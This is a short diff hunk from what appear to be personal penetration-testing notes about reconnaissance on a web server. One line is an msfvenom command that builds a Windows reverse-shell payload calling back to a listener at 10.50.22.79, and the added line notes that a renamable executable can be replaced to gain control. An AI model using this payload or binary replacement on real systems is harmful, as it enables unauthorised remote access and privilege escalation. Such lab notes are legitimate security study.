@@ -121,7 +121,7 @@ RECON FROM GRAYHOST ON THE WEB SERVER
 	msfvenom -p windows/shell/reverse_tcp lhost=10.50.22.79 lport=5555 -b '\x00' -f python
 
 	
-	
+	if you can rename an executable, you can replace it. this is called BINARY REPLACEMENT, and you have notes on it already.
 	
 	
 	
